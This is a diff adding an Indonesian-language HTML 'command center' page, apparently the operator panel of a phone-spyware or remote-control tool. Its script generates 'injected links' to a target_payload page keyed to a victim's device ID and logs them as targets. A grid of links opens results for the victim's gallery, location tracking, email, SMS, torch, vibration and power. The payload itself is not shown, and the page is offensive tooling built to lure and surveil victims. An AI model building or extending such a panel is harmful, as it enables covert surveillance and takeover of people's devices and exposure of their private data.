@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ger4You | COMMAND CENTER 🧬</title>
+    <style>
+        /* BACKGROUND LOGO FULL TANPA LAPISAN PUTIH */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', sans-serif;
+            background: url('https://i.ibb.co/XrCTYjpx/file-292.jpg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+        }
+
+        /* HEADER TRANSPARAN AGAR LOGO TERLIHAT */
+        .header {
+            width: 100%;
+            padding: 20px 0;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.6); /* Transparan Gelap dikit biar teks kebaca */
+            margin-bottom: 20px;
+        }
+
+        .header h1 { margin: 0; font-size: 24px; color: #00ff00; text-shadow: 2px 2px #000; }
+
+        /* CONTAINER BOX */
+        .glass-box {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            border-radius: 15px;
+            width: 85%;
+            max-width: 400px;
+            box-shadow: 0 0 20px rgba(0,255,0,0.2);
+            margin-bottom: 20px;
+            border: 1px solid rgba(0,255,0,0.3);
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            background: rgba(0,0,0,0.5);
+            color: #fff;
+            box-sizing: border-box;
+        }
+
+        .btn-main {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        /* HISTORI TARGET */
+        .history-box {
+            max-height: 120px;
+            overflow-y: auto;
+            background: rgba(0,0,0,0.8);
+            border: 1px solid #444;
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 15px;
+            font-size: 11px;
+            font-family: monospace;
+        }
+        .history-item { border-bottom: 1px solid #333; padding: 5px 0; color: #00ff00; }
+
+        /* APP GRID */
+        .app-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            width: 90%;
+            max-width: 450px;
+            padding-bottom: 30px;
+        }
+
+        .app-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-decoration: none;
+        }
+
+        .icon-sq {
+            width: 65px;
+            height: 65px;
+            background: #fff;
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
+        }
+
+        .app-label {
+            margin-top: 8px;
+            font-size: 12px;
+            color: #fff;
+            font-weight: bold;
+            text-shadow: 1px 1px 3px #000;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <h1>GARIL_RAMDHAN192 ☠️</h1>
+</div>
+
+<div class="glass-box">
+    <label style="font-size: 13px;">Create Injected Link:</label>
+    <input type="text" id="targetID" placeholder="Input Device ID...">
+    <button class="btn-main" onclick="makeLink()">Generate & Copy Link 🧬</button>
+    
+    <div style="margin-top: 15px; font-size: 12px; font-weight: bold; color: #00ff00;">Target History:</div>
+    <div class="history-box" id="historyLog">
+        <div class="history-item">[SYSTEM] No active targets detected...</div>
+    </div>
+</div>
+
+<div class="app-grid">
+    <a href="results.html?type=torch" class="app-item">
+        <div class="icon-sq">🔦</div>
+        <div class="app-label">Senter</div>
+    </a>
+    <a href="results.html?type=gallery" class="app-item">
+        <div class="icon-sq">🖼️</div>
+        <div class="app-label">Galeri</div>
+    </a>
+    <a href="results.html?type=location" class="app-item">
+        <div class="icon-sq">📍</div>
+        <div class="app-label">Lacak</div>
+    </a>
+    <a href="results.html?type=wallpaper" class="app-item">
+        <div class="icon-sq">🎨</div>
+        <div class="app-label">Wallpaper</div>
+    </a>
+    <a href="results.html?type=vibe" class="app-item">
+        <div class="icon-sq">📳</div>
+        <div class="app-label">Getar</div>
+    </a>
+    <a href="results.html?type=email" class="app-item">
+        <div class="icon-sq">📧</div>
+        <div class="app-label">Email</div>
+    </a>
+    <a href="results.html?type=sms" class="app-item">
+        <div class="icon-sq">💬</div>
+        <div class="app-label">SMS</div>
+    </a>
+    <a href="results.html?type=power" class="app-item">
+        <div class="icon-sq" style="background:#ea4335;">🔄</div>
+        <div class="app-label">Daya</div>
+    </a>
+</div>
+
+<script>
+    function makeLink() {
+        const id = document.getElementById('targetID').value;
+        if(!id) return alert("ID Target Jangan Kosong, Bos! 🤣");
+        
+        const link = window.location.origin + "/target_payload.html?id=" + id;
+        navigator.clipboard.writeText(link);
+        
+        // Update Histori Secara Lokal
+        const log = document.getElementById('historyLog');
+        const time = new Date().toLocaleTimeString();
+        log.innerHTML = `<div class="history-item">[${time}] ID: ${id} - Created & Ready 🦠</div>` + log.innerHTML;
+        
+        alert("Link Berhasil Disalin! 😈☠️");
+    }
+</script>
+
+</body>
+</html>
